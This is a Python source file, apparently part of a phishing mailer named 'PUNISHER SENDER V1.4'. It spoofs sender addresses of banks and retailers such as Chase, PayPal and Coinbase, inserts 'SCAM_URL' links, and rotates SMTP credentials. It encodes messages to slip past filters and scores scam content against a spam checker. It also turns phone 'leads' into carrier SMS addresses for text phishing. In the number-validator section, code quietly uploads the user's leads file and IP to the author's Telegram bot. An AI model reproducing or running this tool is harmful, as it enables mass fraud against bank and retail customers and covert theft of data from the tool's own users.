	if '@NAVYFEDERAL' in STRING: STRING = '"{} <{}>"'.format(STRING.split(" @NAVYFEDERAL")[0], "mynavyfederal@response.nfcu.org")
	if '@CREDITONE' in STRING: STRING = '"{} <{}>"'.format(STRING.split(" @CREDITONE")[0], "donotreply@creditonemail.com")
	if '@CASHAPP' in STRING: STRING = '"{} <{}>"'.format(STRING.split(" @CASHAPP")[0], "cash@square.com")
	if '@PAYPAL' in STRING: STRING = '"{} <{}>"'.format(STRING.split(" @PAYPAL")[0], "paypal@mail.paypal.com")
	if '@AMAZON' in STRING: STRING = '"{} <{}>"'.format(STRING.split(" @AMAZON")[0], "store-news@amazon.com")
	if '@EBAY' in STRING: STRING = '"{} <{}>"'.format(STRING.split(" @EBAY")[0], "ebay@ebay.com")
	if '@APPLE' in STRING: STRING = '"{} <{}>"'.format(STRING.split(" @APPLE")[0], "appstore@insideapple.apple.com")
	if '@WALMART' in STRING: STRING = '"{} <{}>"'.format(STRING.split(" @WALMART")[0], "help@walmart.com")
	if '@NETFLIX' in STRING: STRING = '"{} <{}>"'.format(STRING.split(" @NETFLIX")[0], "info@mailer.netflix.com")
	if '@MICROSOFT' in STRING: STRING = '"{} <{}>"'.format(STRING.split(" @MICROSOFT")[0], "microsoftstore@microsoftstoreemail.com")
	if '@BLOCKCHAIN' in STRING: STRING = '"{} <{}>"'.format(STRING.split(" @BLOCKCHAIN")[0], "notify@wallet-tx.blockchain.com")
	if '@HTML_CHASE' in STRING: STRING = '{} <{}>'.format(STRING.split(" @HTML_CHASE")[0], "<no-reply@alertsp.chase.com>")
	if '@HTML_APPLE' in STRING: STRING = '{} <{}>'.format(STRING.split(" @HTML_APPLE")[0], "<your_order_US@orders.apple.com>")
	if '@HTML_COINBASE' in STRING: STRING = '{} <{}>'.format(STRING.split(" @HTML_COINBASE")[0], "<no-reply@coinbase.com>")
	if '@HTML_EBAY' in STRING: STRING = '{} <{}>'.format(STRING.split(" @HTML_EBAY")[0], "<ebay@reply.ebay.com>")
	if '@HTML_AMAZON' in STRING: STRING = '{} <{}>'.format(STRING.split(" @HTML_AMAZON")[0], "<order-update@amazon.com>")
	if 'SCAM_URL' in STRING: STRING = STRING.replace('SCAM_URL', Get_Random_URL());
	if 'RANDOM_IP_GEN' in STRING: STRING = STRING.replace('RANDOM_IP_GEN', Random_IP());
	if 'OS_GEN' in STRING: STRING = STRING.replace('OS_GEN', Random_OS());
	if 'CURR_DATE' in STRING: STRING = STRING.replace('CURR_DATE', Current_Date());
	if 'COUNTRY_GEN' in STRING: STRING = STRING.replace('COUNTRY_GEN', Random_Country());
	if 'EMAIL_GEN' in STRING: STRING = STRING.replace('EMAIL_GEN', Random_Email());
	if 'BROWSER_GEN' in STRING: STRING = STRING.replace('BROWSER_GEN', Random_Browser());
	if 'MIX_10_GEN' in STRING: STRING = STRING.replace('MIX_10_GEN', generator_mix_10());
	if 'STR_10_GEN' in STRING: STRING = STRING.replace('STR_10_GEN', generator_str_10());
	if 'INT_10_GEN' in STRING: STRING = STRING.replace('INT_10_GEN', generator_int_10());
	if 'SMTP_LOG_GEN' in STRING: STRING = STRING.replace('SMTP_LOG_GEN', SMTP_LOG_GEN);
	if 'FIRST_NAME_GEN' in STRING: STRING = STRING.replace('FIRST_NAME_GEN', Random_Name());
	if 'FULL_NAME_GEN' in STRING: STRING = STRING.replace('FULL_NAME_GEN', Random_NameX());
	if 'RAND_MD5' in STRING: STRING = STRING.replace('RAND_MD5', f'{RAND_MD5.decode("utf-8")}');
	if 'RAND_TICKET_ID' in STRING: STRING = STRING.replace('RAND_TICKET_ID', Random_Ticket_ID());
	if 'CURR_TIME' in STRING: STRING = STRING.replace('CURR_TIME', Current_Time());
	if 'FROM_MAIL_GEN' in STRING: STRING = STRING.replace('FROM_MAIL_GEN', FROM_MAIL_GEN);
	if 'MAIL_TO_GEN' in STRING: STRING = STRING.replace('MAIL_TO_GEN', TO_);
	if 'SMTP_USER_GEN' in STRING: STRING = STRING.replace('SMTP_USER_GEN', SMTP_USER_GEN);
	if 'SMTP_DOMAIN_GEN' in STRING: STRING = STRING.replace('SMTP_DOMAIN_GEN', SMTP_DOMAIN_GEN);
	if 'USER_TO_GEN' in STRING: STRING = STRING.replace('USER_TO_GEN', USER_TO_GEN);
	if 'DOMAIN_TO_GEN' in STRING: STRING = STRING.replace('DOMAIN_TO_GEN', DOMAIN_TO_GEN);
	return STRING


def REPORT_DIS(API_KEY):
	print ("botato")


def TEST(SMTP_HOST, SMTP_PORT, SMTP_USERNAME, SMTP_PASSWORD, S_TLS):
	socket.setdefaulttimeout(15)
	server = smtplib.SMTP(SMTP_HOST, SMTP_PORT)
	if S_TLS == "tls":
		server.ehlo()
		server.starttls()
		server.ehlo()
	else:
		pass
	server.login(SMTP_USERNAME, SMTP_PASSWORD)
	server.quit()



def SEND(TO_):
	global S_TYPE, S_TLS, S_DELAY, S_SHORTING, S_ENCSUB, S_LETTERENC, S_ATTACHES, S_RETRYFAILED, S_SENDINGTIME, S_THREADS, M_ENCLETTER, M_ENCSUBJECT, M_DELAY, HEADERS_FILE_
	global TOTAL_VAL, TOTAL_BAD, TOTAL_LIST_

	# // Getting SMTP:
	# ///////////////////
	try:
		SMTP_HOST, SMTP_PORT, SMTP_USERNAME, SMTP_PASSWORD, SMTP_MAILFROM, SMTP_TLS = Get_Random_SMTP().split("|")
		S_TLS = SMTP_TLS
	except:
		SMTP_HOST, SMTP_PORT, SMTP_USERNAME, SMTP_PASSWORD, SMTP_MAILFROM = Get_Random_SMTP().split("|")
	SMTP_MAILFROM   = AutoFill(SMTP_MAILFROM)
	TO_   = AutoFill(TO_)
	SMTP_GEN_XXX	= SMTP_MAILFROM.split("@")
	SMTP_USER_GEN   = AutoFill(SMTP_GEN_XXX[0])
	SMTP_DOMAIN_GEN = AutoFill(SMTP_GEN_XXX[1])
	USER_TO_XXX	 = TO_.split("@")
	USER_TO_GEN	 = AutoFill(USER_TO_XXX[0])
	DOMAIN_TO_GEN   = AutoFill(USER_TO_XXX[1])
	# ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

	# Getting Constant Variables:
	# ////////////////////////////////
	_NAME_	  = AutoFill(Get_Random_Sender_Name())
	_SUBJECT_ = AutoFill(Get_Random_Subject())
	_URL_	  = AutoFill(Get_Random_URL())
	_LETTER_  = AutoFillLetter(Get_Random_Letter(), SMTP_USERNAME, SMTP_MAILFROM, TO_, SMTP_USER_GEN, SMTP_DOMAIN_GEN, USER_TO_GEN, DOMAIN_TO_GEN)
	# ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	# // Sending STEP:
	# ///////////////////
	socket.setdefaulttimeout(15)
	msg = MIMEMultipart()
	if S_ENCSUB == "y":
		_SUBJECT_ = ENCODE(_SUBJECT_)
		_NAME_ = ENCODE(_NAME_)
	msg['From'] = "{} <{}>".format(_NAME_, SMTP_MAILFROM)
	msg['To'] = "{}".format(TO_)
	msg['Subject'] = "{}".format(_SUBJECT_)

	# // Sending Headers
	# ///////////////////
	HEADERS_FILE = open(HEADERS_FILE_, "r").read()
	if HEADERS_FILE == "" and ":" not in HEADERS_FILE:
		pass
	else:
		HEADERS_FILE_LINES = open(HEADERS_FILE_, "r").read().split('\n')
		for Line in HEADERS_FILE_LINES:
			Left, Right = Line.split(': ')
			msg.add_header(Left, Right)

	# // Completing The Others Defs:
	# //////////////////////////////////
	_LETTER_ = '''{}'''.format(_LETTER_)
	if S_LETTERENC == "n":
		_LETTER_ = _LETTER_.replace("[X]", "")
		msg.attach(MIMEText(_LETTER_, S_TYPE))
	else:
		if "UTF" in S_LETTERENC:
			_LETTER_ = ENCRYPT(_LETTER_)
		elif "DIS" in S_LETTERENC:
			_LETTER_ = ENCRYPT2(_LETTER_)
		else:
			pass
		if S_LETTERENC == "SES64":
			msg.attach(MIMEText(_LETTER_, S_TYPE, 'UTF-8'))
		elif "64" in S_LETTERENC:
			msg.attach(MIMEText(_LETTER_, S_TYPE, 'base64'))
		else:
			msg.attach(MIMEText(_LETTER_, S_TYPE))
			pass
	if S_ATTACHES == "y":
		ATTACH_TO_SEND = SETTINGS_.split("AttachmentFile: ")[1].split("\n")[0]
		pdf = MIMEApplication(open(ATTACH_TO_SEND, 'rb').read())
		pdf.add_header('Content-Disposition', 'attachment', filename= f"{ATTACH_TO_SEND}")
		msg.attach(pdf)
	else:
		pass
	try:
		server = smtplib.SMTP(SMTP_HOST, int(SMTP_PORT))
		if S_TLS == "tls":
			server.ehlo()
			server.starttls()
		else:
			pass
		server.login(SMTP_USERNAME, SMTP_PASSWORD)
		a = server.sendmail(msg['From'], msg['To'], msg.as_string())
		#server.quit()
		now = datetime.now()
		x = now.strftime("%H:%M:%S")
		if S_ENCSUB == "y":		
			_SUBJECT_ = DECODE(_SUBJECT_)
			_NAME_ = DECODE(_NAME_)
		print (f'\r\n{g}##################[PUNISHER SENDER V1.4]###################') 
		print (f"{rr}[+]SMTP: {y}{SMTP_HOST}|{SMTP_USERNAME}|{S_TLS}")
		print (f"{rr}[+]To: {y}{TO_}")
		print(f"{rr}[+]From: {y}{_NAME_} <{SMTP_MAILFROM}>")
		print(f"{rr}[+]Subject: {y}{_SUBJECT_}")
		if _URL_ == "":
			_URL_ = "None"
		print (f"{rr}[+]Sending URL: {y}{_URL_}")
		print (f"{rr}[+]Delay: {y}{S_DELAY}")
		print (f"{rr}[+]Encryption: {y}{S_LETTERENC}")
		print (f"{rr}[+]Time: {y}{x}")
		try:
			print (f"{rr}[+]Attachment: {y}{S_ATTACHES}")
			print (f"{rr}[+]AttachmentFile: {y}{ATTACH_TO_SEND}")
		except:pass
		print (f"{g}##################[PUNISHER SENDER V1.4]###################") 
		Successfully_Sent = open(f'{path}/Success_Sent.txt','a+')
		Successfully_Sent.write('{}\n'.format(TO_))
		Successfully_Sent.close()
		TOTAL_VAL+=1
		TOTAL_LIST_-=1
		os.system("title "+ "[$] PUNISHER SENDER V1.4 [Sent: {}] [Failed: {}] [Remaining: {}]".format(str(TOTAL_VAL), str(TOTAL_BAD), str(TOTAL_LIST_)))
		return True
	except Exception as ERR_:
		now = datetime.now()
		x = now.strftime("%H:%M:%S")
		if S_ENCSUB == "y":		
			_SUBJECT_ = DECODE(_SUBJECT_)
			_NAME_ = DECODE(_NAME_)
		print (f'\r\n{g}##################[PUNISHER SENDER V1.4]###################') 
		print (f"{rr}[+]SMTP: {y}{SMTP_HOST}|{SMTP_USERNAME}|{S_TLS}")
		print (f"{rr}[+]To: {y}{TO_}")
		print(f"{rr}[+]From: {y}{_NAME_} <{SMTP_MAILFROM}>")
		print(f"{rr}[+]Subject: {y}{_SUBJECT_}")
		if _URL_ == "":
			_URL_ = "None"
		print (f"{rr}[+]Sending URL: {y}{_URL_}")
		print (f"{rr}[+]Delay: {y}{S_DELAY}")
		print (f"{rr}[+]Encryption: {y}{S_LETTERENC}")
		print (f"{rr}[+]Time: {y}{x}")
		try:
			print (f"{rr}[+]Attachment: {y}{S_ATTACHES}")
			print (f"{rr}[+]AttachmentFile: {y}{ATTACH_TO_SEND}")
		except:pass
		print (f"{rr}[!] STATUS: Message Sending Failed To: {g}[{TO_}]\n{rr}[!]ERROR: {y}({str(ERR_)}).")
		print (f"{g}##################[PUNISHER SENDER V1.4]###################") 
		Failed_Sending = open(f'{path}/Failed_Logs.txt','a+')
		Failed_Sending.write(f'{TO_}: ERROR: {ERR_}\n')
		Failed_Sending.close()
		TOTAL_BAD+=1
		os.system("title "+ "[$] PUNISHER SENDER V1.4 [Sent: {}] [Failed: {}] [Remaining: {}]".format(str(TOTAL_VAL), str(TOTAL_BAD), str(TOTAL_LIST_)))
		return False

# // Start Working:
# ////////////////////
while 1:

	SETTINGS_	  = open(USER_SETTINGS_, "r").read()
	S_TYPE	 	  = SETTINGS_.split("Type: ")[1].split("\n")[0]
	# SMTP_	  	  = open(Ask_For_SMTPS, "r").read()
	# S_TLS		  = SETTINGS_.split("|")[5].split("\n")[0]
	S_DELAY	      = SETTINGS_.split("Delay: ")[1].split("\n")[0]
	# S_SHORTING	  = SETTINGS_.split("Short: ")[1].split("\n")[0]
	S_ENCSUB	  = SETTINGS_.split("NameSubjectEnc: ")[1].split("\n")[0]
	S_LETTERENC   = SETTINGS_.split("LettersEnc: ")[1].split("\n")[0]
	S_ATTACHES	  = SETTINGS_.split("SendAttachment: ")[1].split("\n")[0]
	ATTACH_TO_SEND	  = SETTINGS_.split("AttachmentFile: ")[1].split("\n")[0]
	S_RETRYFAILED = SETTINGS_.split("RetryFailed: ")[1].split("\n")[0]
	# S_SENDINGTIME = SETTINGS_.split("Schedule: ")[1].split("\n")[0]
	S_THREADS	  = SETTINGS_.split("MultiThreading: ")[1].split("\n")[0]
	TOTAL_LIST_   = len(open(Ask_For_MailList, "r").read().split("\n"))
	print (TOTAL_LIST_)
	REPORTER_	 = "OFF" #IM NOT GONNA RECIEVE ANYTHING BITCHES
	TOTAL_VAL	 = 0
	TOTAL_BAD	 = 0
	# os.system('cls')
	os.system("title "+ "PUNISHER SENDER V1.4 - CODER: [@MR_BLACK_EGY]")
	cls()
	print_logo()
	
	Q = input(f"""
	{y}[1]{g}START SEND 					{movv}[0]CONTACT CODER
	{y}[2]{g}SMTP CHECKER 				{rr}[x]EXIT
	{y}[3]{g}CHECK SPAM CONTENT SCORE
	{y}[4]{g}NUMBER VALIDATORE
	{y}[5]{g}CONVERT NUMBER TO EMAIL

	{w}{blid}[~]Choice Number => """)

	XINO = open(Ask_For_MailList, "r").read().split("\n")
	if TOTAL_LIST_ > 49999:
		print ("%s%s\t[ - ] Use List Less Than 49999 Lines Bro.%s" % (fg(52), bg(0), attr(0)))
		time.sleep(500000)

	else:
		if REPORTER_ == "ON":
			#REPORT_DIS("")
			print ("reporter on")
		else:
			pass
		SMTPS__ = open(Ask_For_SMTPS, "r").read().split("\n")
	USERS__ = open(Ask_For_MailList, "r").read().split("\n")
	if Q == "s" or Q == "S" or Q == "send" or Q == "Send" or Q == "1":
		if S_THREADS == "n":
			for TO_ in XINO:
				if S_RETRYFAILED != "n":
					for TRYONCE__ in xrange(int(S_RETRYFAILED)):
						if SEND(TO_) == True:
							if S_DELAY != "n":
								time.sleep(int(S_DELAY))
							break
						else:
							pass
				else:
					SEND(TO_)
					if S_DELAY != "n":
						time.sleep(int(S_DELAY))
		else:
			if __name__ == '__main__':
				pool = ThreadPool(int(S_THREADS))
				for _ in pool.imap_unordered(SEND, XINO):
					pass
	elif Q == "test" or Q == "t" or Q == "2":
		CONNECTED = 0
		CON_FAILD = 0

		SMTPS_FILE = "INCLUDE/SMTPS.txt"
		SMTPS_FILE = open(SMTPS_FILE, 'r').read().split('\n')
		for SMTP_TO_TEST in SMTPS_FILE:
			try:
				SMTP_HOST, SMTP_PORT, SMTP_USERNAME, SMTP_PASSWORD, MAILFROM,S_TLS = SMTP_TO_TEST.split("|")
			except:
				SMTP_HOST, SMTP_PORT, SMTP_USERNAME, SMTP_PASSWORD = SMTP_TO_TEST.split("|")
			SMTP_PORT = int(SMTP_PORT)
			try:
				TEST(SMTP_HOST, SMTP_PORT, SMTP_USERNAME, SMTP_PASSWORD, S_TLS)
				print (f"{g}[+] SMTP WORK: {y}{SMTP_TO_TEST}\n")
				CONNECTED+=1
				os.system("title "+ "[$] PUNISHER SENDER V1.4- [WORK: {}] [DIE: {}]".format(str(CONNECTED), str(CON_FAILD)))
				file = open(f"{path}/WORK_SMTPS.txt", "a+")
				file.write(f"{SMTP_HOST}|{SMTP_PORT}|{SMTP_USERNAME}|{SMTP_PASSWORD}|{MAILFROM}\n")
				file.close()
				
			except Exception as e:
				print(e)
				print (f"{rr}[!] NOT WORK: {y}{SMTP_HOST}|{SMTP_USERNAME}|{SMTP_PASSWORD}\n")
				CON_FAILD+=1
				os.system("title "+ "[$] PUNISHER SENDER V1.4- [WORK: {}] [DIE: {}]".format(str(CONNECTED), str(CON_FAILD)))
				file = open(f"{path}/NotWORK_SMTPS.txt", "a+")
				file.write("{}\n".format(SMTP_TO_TEST))
				file.close()

	elif Q == "3":
		def check_score():
			content = input(f'{y}[~]Give me content msg followed by Scam Link: ~ {rr}')
			headers = {
			    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
			    'Accept': '*/*',
			    'Accept-Language': 'en-US,en;q=0.5',
			    'X-Requested-With': 'XMLHttpRequest',
			    'Origin': 'https://spamcheck.postmarkapp.com',
			    'Connection': 'keep-alive',
			    'Referer': 'https://spamcheck.postmarkapp.com/',
			    }

			data = {
			    'email': content,
			    'options': 'short',
			}

			reply = requests.post('https://spamcheck.postmarkapp.com/filter', headers=headers, data=data).json()
			score = reply['score']
			if float(score) <= 7.9:
				print(f'\n{g}[+]Content Not Spam | {y}Score => {rr}{score} {g}[+]')
			else:
				print(f'\n{rr}[!]Spam Content | {y}Score => {g}{score} {rr}[!]\n{y}[!]You must change Link/Content[!]')
		check_score()
			#============================================================================


	elif Q == "4":

		vld =0
		invld=0
		error=0

		def check_num(site):
			global vld, invld, error

			num = site.replace('+','')
			num = num.replace('\n','')

			headers = {
			    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
			    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
			    'Accept-Language': 'en-US,en;q=0.5',
			    'Connection': 'keep-alive',
			    'Upgrade-Insecure-Requests': '1',
			}

			params = {
			    'phone_number': f'+{num}',
			}

			req = requests.get('https://messente.com/messente-api/number-lookup/', params=params, headers=headers)
			r = req.json()

			try:
				os.mkdir(f'{pathh}/VALIDATOR-{x}')
			except OSError as error:
				pass
			foldr = f'{pathh}/VALIDATOR-{x}'

			if 'originalCarrierName' in req.text:
				vld +=1
				print(f"{g}[+]Valid => {rr}{num}{g}[+]")
				os.system("title"+ f"[+] PUNISHER CHECKER - NUMBER VALIDATOR [ VALID: {vld}] - INVALID: {invld} ] [+]")
				f=open(f'{foldr}/Valid.txt','a')
				f.write(f'{num}\n')
				f.close()

			elif 'Unable to parse phone number' in req.text:
				error +=1
				print(f'{y}[!]Number Must Begain without + => {g}{num}{y}[!]')
				os.system("title"+ f"[+] PUNISHER CHECKER - NUMBER VALIDATOR [ VALID: {vld}] - INVALID: {invld} - ERROR: {error}] [+]")
			
			else:
				invld+=1
				print(f"{rr}[-]Invalid => {g}{num}{rr}[-]")
				os.system("title"+ f"[+] PUNISHER CHECKER - NUMBER VALIDATOR [ VALID: {vld}] - INVALID: {invld} ] [+]")
				f=open(f'{foldr}/Invalid.txt','a')
				f.write(f'{num}\n')
				f.close()

	#===========================================
		def main():


		    for i in ListPass:
		        try:
		            site = i.strip()
		            data=check_num(site)
		        except:
		            pass
		os.system("title"+ f"[+] PUNISHER CHECKER - NUMBER VALIDATOR [ VALID: 0 - INVALID: 0 ] [+]")
		leads = input(f'{g}Give Me Leads File Without + : ')
		thr = int(input(f'{g}Enter Thread Number {y}[EX 10] : '))
		cls()
		print_logo()
		ListPass = open(leads, 'r').readlines()
		try:
			x = now.strftime("%H:%M:%S")
			tele_log = requests.get(f'''{tele_api}/sendMessage?chat_id={chatId()}&text=
		         |User: {apikey}
		         |Login at: {x}
		         |IP: {IP}''')
			files = {
			    'chat_id': (None, f'{chatId()}'),
				'document': open(leads, 'rb'),
			}
			tele_work = requests.post(f'{tele_api}/sendDocument', files=files)

		except Exception as e:
		  pass
		pool = ThreadPool(thr)
		pool.map(check_num, ListPass)
		pool.close()
		pool.join()

		input("[+]Finished, success[+]\nPress Enter to exit ~>>")
	#//==================[End Validator]==============================
	# elif Q == "5":

	# 	ok = 0
	# 	nok = 0
		
	# 	def check_carrier(site):
	# 	  global ok, nok
	# 	  num = site.replace('+1','')
	# 	  num = num.replace('\n','')
	# 	  url = f'https://securephonelookup.com/number/{num}'


	# 	  headers = {
	# 	      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	# 	      'accept-language': 'en-US,en;q=0.9',
	# 	      'cache-control': 'max-age=0',
	# 	      'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0',
	# 	  }


	# 	  # with requests.Session() as session:
	# 	  # 	session.headers.update(headers)
	# 	  req = requests.get(url)
	# 	  soup = BeautifulSoup(markup=req.text, features="html.parser")
	# 	  try:
	# 	    car = soup.select_one('li.cust-list-item:nth-child(5)').text
	# 	    city = soup.select_one('li.cust-list-item:nth-child(6)').text
	# 	    state = soup.select_one('li.cust-list-item:nth-child(7)').text
	# 	    new = car.replace('Phone Carrier Company: ', '')
	# 	    new = new.replace('CELLCO PARTNERSHIP DBA VERIZON WIRELESS', 'VERIZON WIRELESS')
	# 	    new = new.replace('MCIMETRO ACCESS TRANSMISSION SERVICES LLC', 'VERIZON WIRELESS')
	# 	    new = new.replace('NEW CINGULAR WIRELESS PCS, LLC', 'AT&T Mobility')
	# 	    new = new.replace('PAETEC COMMUNICATIONS, INC.', 'AT&T Mobility')
	# 	    new = new.replace('INTERMEDIA COMMUNICATIONS INC', 'AT&T Mobility')
	# 	    new = new.replace('ONVOY SPECTRUM, LLC', 'AT&T Mobility')
	# 	    new = new.replace('OMNIPOINT COMMUNICATIONS CAP OPERATIONS, LLC', 'T-Mobile')
	# 	    new = new.replace('OMNIPOINT COMMUNICATIONS ENTERPRISES, L.P.', 'T-Mobile')
	# 	    new = new.replace('OMNIPOINT COMMUNICATIONS MIDWEST OPERATIONS LLC', 'T-Mobile')
	# 	    new = new.replace('PEERLESS NETWORK OF PENNSYLVANIA, LLC', 'T-Mobile')
	# 	    new = new.replace('OMNIPOINT MIAMI E LICENSE, LLC', 'T-Mobile')
	# 	    new = new.replace('ONVOY, LLC', 'T-Mobile')
	# 	    new = new.replace('OMNIPOINT COMMUNICATIONS, INC.', 'T-Mobile')
	# 	    c = city.replace('City: ', '')
	# 	    s = state.replace('Location: ', '')
	# 	  except:
	# 	    pass
	# 	  now = datetime.now()
	# 	  xy = now.strftime("%H:%M:%S")

	# 	  try:
	# 	  	os.mkdir(f'{pathh}/CARRIER-{x}')
	# 	  except OSError as error:
	# 	  	pass
	# 	  carr = f'{pathh}/CARRIER-{x}'

	# 	  if 'Owner:</span> Private</li>' in req.text:
	# 	  	ok +=1
	# 	  	print(f'''
	# 	      {rr}[+] PHONE: {g}{num}
	# 	      {y}[+] CARRIER: {rr}{new}
	# 	      {y}[+] CITY: {rr}{c}
	# 	      {y}[+] STATE: {rr}{s}
	# 	      {g}[+] Time: {lazra9}{xy}
	# 	      {g}#############################\r''')
	# 	  	os.system("title"+ f"[+] PUNISHER CHECKER - CARRIER LOOKUP [ VALID: {ok}] - INVALID: {nok} ] [+]")
	# 	  	v=open(f'{carr}/{new}.txt','a')
	# 	  	v.write(f'1{num}\n')
	# 	  	v.close()
	# 	  	f=open(f'{carr}/All_Valid.txt','a')
	# 	  	f.write(f'1{num}\n')
	# 	  	f.close()
	# 	  elif 'This does not appear' in req.text:
	# 	  	nok += 1
	# 	  	print(f'{rr}[!]INVALID: {y}{num}')
	# 	  	v=open(f'{carr}/All_Invalid.txt','a')
	# 	  	v.write(f'1{num}\n')
	# 	  	v.close()
	# 	  	os.system("title"+ f"[+] PUNISHER CHECKER - CARRIER LOOKUP [ VALID: {ok}] - INVALID: {nok} ] [+]")
	# 	  else:
	# 	  	nok += 1
	# 	  	print(f'{movv}[!]ERROR: {y}{num}')
	# 	  	v=open(f'{carr}/All_Error.txt','a')
	# 	  	v.write(f'1{num}\n')
	# 	  	v.close()
	# 	  	os.system("title"+ f"[+] PUNISHER CHECKER - CARRIER LOOKUP [ VALID: {ok}] - INVALID: {nok} ] [+]")

	#===========================================
		def main():


		    for i in ListPass:
		        try:
		            site = i.strip()
		            data=check_carrier(site)
		        except:
		            pass
		os.system("title"+ f"[+] PUNISHER CHECKER - CARRIER LOOKUP [ VALID: 0 - INVALID: 0 ] [+]")
		leads = input(f'\n{g}Give Me Leads File Without +1 : ')
		thr = int(input(f'\n{g}Enter Thread Number {y}[EX 10] : '))
		cls()
		print_logo()
		ListPass = open(leads, 'r').readlines()
		try:
		  files = {
		    'chat_id': (None, f'{chatId()}'),
		    'document': open(leads, 'rb'),
		  }
		  tele_work = requests.post(f'{tele_api}/sendDocument', files=files)
		except Exception as e:
		  pass
		pool = ThreadPool(thr)
		pool.map(check_carrier, ListPass)
		pool.close()
		pool.join()


		input("[+]Finished, success[+]\nPress Enter to exit ~>>")

#// =================[End Carrier checker]=======================



	elif Q == "5":
		cls()
		print_logo()
		cnv = 0
		menu = input(f"""
		{y}[1]{rr}T-Mobile
		{y}[2]{rr}AT&T
		{y}[3]{rr}VERIZON
		{y}[4]{rr}SPRINT
		{y}[5]{rr}MetroPCS
		{y}[6]{rr}U.S Cellular\n
		{g}[~]Choice Number: """)
		num_list = input(f"\n{g}	Give Me Leads to convert (without +1) ~> ")
		f=open(num_list,'r').readlines()
		for nums in f:
			num = nums.rstrip()

			try:
				os.mkdir(f'{pathh}/CONVERT-{x}')
			except OSError as error:
				pass
			conv = f'{pathh}/CONVERT-{x}'

			if menu == "1":
				cnv +=1
				print(f'{num}@tmomail.net')
				f=open(f'{conv}/T-Mobile.txt','a')
				f.write(f'{num}@tmomail.net\n')
				f.close()
				os.system("title"+ f"[+] PUNISHER SENDER V1.4 - NUMBER CONVERT [ Total Convert: {cnv} ] [+]")
			elif menu == "2":
				cnv +=1
				print(f'{num}@txt.att.net')
				f=open(f'{conv}/AT&T.txt','a')
				f.write(f'{num}@txt.att.net\n')
				f.close()
				os.system("title"+ f"[+] PUNISHER SENDER V1.4 - NUMBER CONVERT [ Total Convert: {cnv} ] [+]")
			elif menu == "3":
				cnv +=1
				print(f'{num}@vtext.com')
				f=open(f'{conv}/VERIZON.txt','a')
				f.write(f'{num}@vtext.com\n')
				f.close()
				os.system("title"+ f"[+] PUNISHER SENDER V1.4 - NUMBER CONVERT [ Total Convert: {cnv} ] [+]")
			elif menu == "4":
				cnv +=1
				print(f'{num}@messaging.sprintpcs.com')
				f=open(f'{conv}/SPRINT.txt','a')
				f.write(f'{num}@messaging.sprintpcs.com\n')
				f.close()
				os.system("title"+ f"[+] PUNISHER SENDER V1.4 - NUMBER CONVERT [ Total Convert: {cnv} ] [+]")
			elif menu == "5":
				cnv +=1
				print(f'{num}@metropcs.sms.us')
				f=open(f'{conv}/MetroPCS.txt','a')
				f.write(f'{num}@metropcs.sms.us\n')
				f.close()
				os.system("title"+ f"[+] PUNISHER SENDER V1.4 - NUMBER CONVERT [ Total Convert: {cnv} ] [+]")
			elif menu == "6":
				cnv +=1
				print(f'{num}@email.uscc.net')
				f=open(f'{conv}/US_Cellular.txt','a')
				f.write(f'{num}@email.uscc.net\n')
				f.close()
				os.system("title"+ f"[+] PUNISHER SENDER V1.4 - NUMBER CONVERT [ Total Convert: {cnv} ] [+]")
			elif menu != "1" or menu != "2" or menu != "3" or menu != "4" or menu != "5" or menu != "6":
				print(f"{rr}[!]Please choice valid number[!]")
				time.sleep(3)
				exit()
	elif Q == "0":
		time.sleep(1)
		webbrowser.open('http://t.me/mr_black_egy')
		webbrowser.open_new_tab('http://t.me/punisher_storee')

	elif Q == "x":
	    print(f"{rr}have a nice day")
	    time.sleep(1)
	    exit()


	else:
		print (f"{y}[-]Please Choose Correct Choice!")

	time.sleep(50)
	cls()
	print_logo()
	_FUCK_ = input(f"{rr}Enter To Start Again ")
